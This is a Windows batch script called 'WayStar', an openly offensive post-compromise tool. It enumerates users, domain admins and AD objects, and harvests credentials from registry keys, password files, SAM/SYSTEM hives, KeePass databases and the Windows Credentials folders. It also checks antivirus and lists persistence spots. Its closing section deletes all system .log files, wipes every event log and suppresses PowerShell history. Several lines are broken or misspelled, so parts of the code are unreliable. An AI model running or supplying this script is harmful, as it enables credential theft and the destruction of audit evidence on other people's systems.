:: WayStar by SYN-3r

@echo off

:: color variables
SET red=color 04
SET gray=color 08
SET black=color 00
SET green=color 0a
SET yellow=color 06
SET blue=color 09
SET magenta=color 0c
SET cyan=color 03
SET white=color 0f
SET blink=color 0f
SET normal=color

echo /-----------------------------------------------------------------------------\\
echo ^|                           %white% %blink%  ⭐%normal%  %cyan% WayStar by SYN-3r %white% %blink%  ⭐%normal%                            %normal% ^|
echo ^|                       %cyan% A Windows Enummeration Script                         %normal% ^|
echo ^|-----------------------------------------------------------------------------^|
echo ^|  %magenta% , : ^| ^| %cyan% ^| ^|:  %green% ^|^|  :     %magenta% ,  :  ^|  ^|+%cyan% ^|: ^| :%green%  : :^|   .        %normal% ,%cyan%               . %normal% ^|
echo ^|      %magenta% , : ^| %cyan% :^|  ^|^|  %green% ^|:  :    %magenta% ,  ^|  ^| :%cyan% ^| : ^| : ^|%green% :   %cyan% ^|  %white% %blink%  .%normal%                     %magenta% : %normal% ^|
echo ^|         %magenta% %white% %blink%  .%normal% %magenta% ' ':  %cyan% ^|^|  ^|:  %green% ^|  '%magenta%        , ^|^| %cyan% ^| : ^| %green% ^|: : ^|   .%normal%   ,           %normal% %white% %blink%  .%normal%    %magenta% :. %normal% ^|
echo ^|                %magenta% ,'  ^|^|  %cyan% ^|  ' ^|   %normal% *%magenta%     , : ^| ^| %cyan% :^| ^|%normal% *%green% ^|  :   %magenta% :               %cyan% :%green% ^| %normal% ^|
echo ^|        *    *       %magenta% ,  ^|  : %cyan% :  ^|  %green% . %magenta%      , ' :^| ^| %cyan% :^| . %green% : :         %normal% *%cyan%    :.%green% ^|^| %normal% ^|
echo ^|             %white% %blink%  .%normal% ,           %magenta%  ^| ^|  %cyan% ^|  %green% : .:^|  %magenta%      , ^| ^|%cyan% ^| ^| : %green% ^|: ^|          ^| ^|^| %normal% ^|
echo ^|      '          %white% %blink%  .%normal%          %magenta% + ,  ^|  %green% :  .: . %magenta%         '^| ^| %cyan% : :^|%green%  :    %normal% %white% %blink%  .%normal%    %magenta% ^|:%cyan% ^| ^|%green% ^| %normal% ^|
echo ^|         %white% %blink%  .%normal%                  %white% %blink%  .%normal%     %magenta% , %cyan% *^|  ^|%green% ^| : %normal%       ,%magenta%     ^| ^| %cyan% :^| %green% ^| :      %magenta% ^|:%cyan% ^| %green% ^|  %normal% ^|
echo ^| %white% %blink%  .%normal%                 %white% %blink%  .%normal%           %white% %blink%  .%normal%         %magenta% ^|^| %green% ^|.: %normal% *%magenta%           ^| ^|%cyan% ^| : %green% :     %magenta% :^|%cyan% ^|^|%green% ^|   %normal% ^|
echo ^|        %white% %blink%  .%normal%             %white% %blink%  .%normal%    . *    %white% %blink%  .%normal%    %white% %blink%  .%normal%   %magenta% , ^|^|^|.  %normal% +        +%magenta%  '^| %cyan% ^|^|%green% ^|  %white% %blink%  .%normal%   %magenta% ^|^|%cyan% ,%green% ^|    %normal% ^|
echo ^|     %white% %blink%  .%normal%              *              %white% %blink%  .%normal%      %magenta% +:,^|%green% ^| %magenta%             %white% %blink%  .%normal%  %magenta% ^|^|%cyan% ^|^|  %magenta% :%white% %blink%  .%normal% %magenta% ^|%cyan% ^|,%green% ^|     %normal% ^|
echo ^| +                      %white% %blink%  .%normal%                 %magenta% ..%magenta% ^|%cyan% ^|%normal% *%magenta%           . ^| :%cyan% ,^|%green% ^|+ %magenta% ^|^|^|%cyan% ,%green% ^|      %normal% ^|
echo ^|     %white% %blink%  .%normal%                          +      %magenta% : %cyan% ^|^|%green% ^|,%magenta%         .^| :^| %cyan% ^| ^| %green% ^|.^| %magenta% ^|%cyan% ^|%green% ,     %normal% %white% %blink%  .%normal%   %normal% ^|
echo ^|       *     +   '               +  %magenta% :^|%green% ^| ^|, %magenta%     :.%cyan% +. ^|^|%green%  ^|^| ^| %magenta% ^|:,%cyan% ^|^| %green% ,          %normal% ^|
echo ^|                            %white% %blink%  .%normal%       %magenta% .^|%green% ^|, .%magenta%     ..^|%cyan% ^| ^| %green% ^|: %cyan% ', ,^| %magenta% ^| %cyan% ^|%green% ,  %normal% +         %normal% ^|
echo ^|  %white% %blink%  .%normal%        + +                      %magenta% ^|^|  %magenta%       ^|^|%cyan% ^|: %green% ,       %magenta% :%cyan% ^| %green% ^|               %normal% ^|
echo ^|              +         %white% %blink%  .%normal%       %white% %blink%  .%normal%     %magenta% ^| %green% .  %magenta%     ,^|%cyan% ^|^|%green% .:      %magenta% .%cyan% ^|%green% ^|    %normal% %white% %blink%  .%normal%       %white% %blink%  .%normal%     ,%normal% ^|
echo ^|          '                           %magenta% ,^|%green% . %magenta%   %white% %blink%  .%normal% %magenta%   ,:%cyan% ^|%green% ^|^|   %normal% + %magenta% ^|%cyan% ^|%green% '     %normal% ,           %normal% ^|
echo ^|  %gray% __    %normal% +      *                         %green% ,'%magenta%        ,%cyan% '%green% ^|.    %magenta% ,%green% :                 %normal% ^|
echo ^|%gray% ^,  ,---^^^----....____,..^---,^,,----.,.___          %cyan% ,%green% .    %cyan% ,%green% .  .    %gray% ____,.,-%normal% ^|
echo ^|%gray% ::::___,---^^,---^   ^  ^ ^::::::::^   ::::^^^---,..___ __,..---^^::::::::   %normal% ^|
echo ^|%gray% --^ ::::::  :^::::::::::::::::::::: ^  ::::::::::::::::: :::  ,,--..,__ :::  %normal% ^|
echo \-----------------------------------------------------------------------------/
echo.
echo.

:: BEGINNING OF SCRIPT

echo %blue% ..................................................... %normal% >> SituationalAwareness.txt
echo %green%             SITUATIONAL AWARENESS %normal >> SituationalAwareness.txt
echo %blue% ..................................................... %normal% >> SituationalAwareness.txt

echo . >> SituationalAwareness.txt
echo %cyan% Current user: %normal% >> SituationalAwareness.txt
echo %USERNAME% >> SituationalAwareness.txt
echo. >> SituationalAwareness.txt

echo %cyan% Does powershell exist? %normal% >> SituationalAwareness.txt
:: check to see if powershell exists
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion >> SituationalAwareness.txt
echo. >> SituationalAwareness.txt

echo %cyan% Date of last reboot: %normal% >> SituationalAwareness.txt
dir /a c:\pagefile.sys >> SituationalAwareness.txt
echo. >> SituationalAwareness.txt

echo %cyan% Commands run at startup: %normal% >> SituationalAwareness.txt
wmic startup get caption,command >> SituationalAwareness.txt

type SituationalAwareness.txt
type SituationalAwareness.txt >> WayStar.txt
del SituationalAwareness.txt

echo %blue% ..................................................... %normal% >> OsInfo.txt
echo %green%                    OS INFORMATION %normal >> OsInfo.txt
echo %blue% ..................................................... %normal% >> OsInfo.txt
echo. >> OsInfo.txt

echo %green% Windows  Product Name: %normal% >> OsInfo.txt
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName >> OsInfo.txt
echo %green% Windows  Install Date: %normal% >> OsInfo.txt
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate >> OsInfo.txt
echo %green% Windows  Registered Owner: %normal% >> OsInfo.txt
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner >> OsInfo.txt
echo %green% Windows  System Root: %normal% >> OsInfo.txt
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot >> OsInfo.txt
echo. >> OsInfo.txt

echo %cyan% Version and system info: %normal% >> OsInfo.txt
ver >> OsInfo.txt
echo. >> OsInfo.txt
systeminfo >> OsInfo.txt
echo. >> OsInfo.txt

type OsInfo.txt
type OsInfo.txt >> WayStar.txt
del OsInfo.txt
 

echo %blue% ..................................................... %normal% >> Users.txt
echo %green%            USERS, ACCOUNTS, AND GROUPS %normal >> Users.txt 
echo %blue% ..................................................... %normal% >> Users.txt
echo . >> Users.txt

echo %cyan% Admins: %normal% >> Users.txt
net localgroup administrators >> Users.txt
echo %cyan% Accounts and Groups with admin access to domain controler: %normal% >> Users.txt
net localgroup administrators /domain >> Users.txt
echo. >> Users.txt

%cyan% Users: %normal% >> Users.txt
net users >> Users.txt
echo. >> Users.txt
echo %green% Useful Users: %normal% >> Users.txt
dsquery * -filter "(objectclass=user)" -attr name dnshostname samaccountname description -limit 0 >> Users.txt
echo. >> Users.txt

echo %cyan% Groups: %normal% >> Users.txt
net localgroup >> Users.txt
echo. >> Users.txt
echo %green% Useful Groups: %normal% >> Users.txt
dsquery * -filter "(objectclass=group)" -attr name dnshostname samaccountname description -limit 0 >> Users.txt
echo. >> Users.txt

echo %cyan% Accounts: %normal% >> Users.txt
net accounts >> Users.txt
echo. >> Users.txt

echo %green% Useful Computers: %normal% >> Users.txt
dsquery * -filter "(objectclass=computer)" -attr name dnshostname operatingsystem description -limit 0 >> Users.txt

type Users.txt
type Users.txt >> WayStar.txt
del Users.txt

echo %blue% ..................................................... %normal% >> Passwords.txt
echo %green%                   PASSWORDS %normal >> Passwords.txt
echo %blue% ..................................................... %normal% >> Passwords.txt
echo. >> Passwords.txt

echo %cyan% HKLM and HKCU: %normal% >> Passwords.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul ^| findstr "DefaultUserName DefaultDomainName DefaultPassword"  >> Passwords.txt
reg query HKLM /f password /t REG_SZ /s /k >> Passwords.txt
reg query HKCU /f password /t REG_SZ /s /k >> Passwords.txt
reg query "HKCU\Software\ORL\WinVNC3\Password"  >> Passwords.txt
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  >> Passwords.txt
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  >> Passwords.txt
reg query HKLM if /fd password /t REG_SZ /s >> Passwords.txt
echo. >> Passwords.txt

:: searches passwords for cleartext passwords
%cyan% Cleartext Passwords: %normal% >> Passwords.txt
dir /s /b *pass* *cred* *vnc* *.config* >> Passwords.txt
findstr /SI password *.txt >> Passwords.txt

type Passwords.txt
type Passwords.txt >> WayStar.txt
del Passwords.txt


echo %blue% ..................................................... %normal% >> Security.txt
echo %green%               SECURITY DETECTION  %normal  >> Security.txt
echo %blue% ..................................................... %normal% >> Security.txt
echo. >> Security.txt

echo %red% Antivirus detection: %normal% >> Security.txt
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName >> Security.txt
echo. >> Security.txt

type Security.txt
typr Security.txt >> WayStar.txt
del Security.txt

echo %blue% ..................................................... %normal% >> Files.txt
echo %green%                SCHED TASKS AND FILES %normal  >> Files.txt
echo %blue% ..................................................... %normal% >> Files.txt
echo. >> Files.txt

echo %cyan% Scheduled tasks: %normal% >> Files.txt
schtasks /query /fo LIST /v ^| findstr "TaskName Author: Run: User:" >> Files.txt
schtasks/query >> Files.txt

echo %cyan% SAM and SYSTEM files: %normal% >> Files.txt
dir %SYSTEMROOT%\repair\SAM 2>nul >> Files.txt
dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul >> Files.txt
dir %SYSTEMROOT%\System32\config\SAM 2>nul >> Files.txt
dir %SYSTEMROOT%\repair\system 2>nul >> Files.txt
dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul >> Files.txt
dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul >> Files.txt
dir /a /b /s SAM.b* >> Files.txt
echo. >> Files.txt

echo %cyan% Vnc, kdbx, or rdp files: %normal% >> Files.txt
dir /a /s /b *.kdbx *vnc.ini *.rdp >> Files.txt
echo. >> Files.txt

echo %cyan% Folders with weak permissions: %normal% >> Files.txt
icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone" >> Files.txt
icalcs "C:\Program Files (x86)\*" 2>nul" 2>nul | findstr "(F)" | findstr "Everyone" >> Files.txt
icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> Files.txt
icalcs "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> Files.txt
echo. >> Files.txt

echo %cyan% Recent Wordpad Documents: %normal% >> Files.txt
reg query "HKCU\SOftware\Microsoft\Windows\CurrentVersion\Applets\Wordpad\Recent File List" >> Files.txt
echo. >> Files.txt


echo %cyan% Typed URLS: %normal% >> Files.txt
reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLS" >> Files.txt
echo. >> Files.txt

echo %cyan% Mounted Devices: %normal% >> Files.txt
reg query HKLM\System\MountedDevices >> Files.txt
echo. >> Files.txt

echo %cyan$ USB devices: %normal% >> Files.txt
reg query HKLM\System\CurrentControlSet\Enum\USB >> Files.txt

type Files.txt
type Files.txt >> WayStar.txt
del Files.txt

echo %blue% ..................................................... %normal% >> Persistence.txt
echo %green%                PLACES FOR PERSISTENCE %normal  >> Persistence.txt
echo %blue% ..................................................... %normal%  >> Persistence.txt
echo. >> Persistence.txt

echo %cyan% Possible locations to set up persistence: %normal% >> Persistence.txt
reg query HKEY_CURRENT_USER\Software\Microosoft\Windows\CurrentVersion\Run >> Persistence.txt
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce >> Persistence.txt
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run >> Persistence.txt
reg query HKEY_LOCAL_MACHINE\SOftware\Microsoft\Windows\CurrentVersion\RunOnce >> Persistence.txt
reg query HKEY_LOCAL_MACHINE\SOftware\Microsoft\Windows\CurrentVersion\RunOnceEx >> Persistence.txt
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" >> Persistence.txt
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" >> Persistence.txt
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" >> Persistence.txt
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" >> Persistence.txt

type Persistence.txt
type Persistence.txt >> WayStar.txt
del Persistence.txt

::
::ENDING ACTIONS
::

:: cleaning files
del %WINDIR%\*.log /a /s /q /f
for /f %a in ('wevtutil el') do @wevtutil cl "%a"

echo %red% All contents saved to WayStar.txt %normal%

echo %blue% ..................................................... %normal%
echo %green%                 Other Stuff to add %normal
echo %blue% ..................................................... %normal%
echo .


::ntusers.dat file windows

:: display all processes
wmic process get procesid,commandline

:: display logical drives
wmic logicaldisk get description,name


echo %blue% ..................................................... %normal%
echo %green%                     POWERSHELL   %normal%
echo %blue% ..................................................... %normal%
echo .

powershell
SaveNothing
MaximumHistoryCount 0

:: color variables
SET red=color 04
SET gray=color 08
SET black=color 00
SET green=color 0a
SET yellow=color 06
SET blue=color 09
SET magenta=color 0c
SET cyan=color 03
SET white=color 0f
SET blink=color 0f 
SET normal=color

echo %cyan% Antivirus: %normal%
Get-WmiObject -Name space "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop

echo %cyan% Version: %normal%
$psVersionTable
echo.

echo %cyan% Antivirus: %normal%
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop
echo. 

echo %cyan% Credentials: %normal%
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
echo.



echo %red% All contents saved to WayStar.txt %normal%

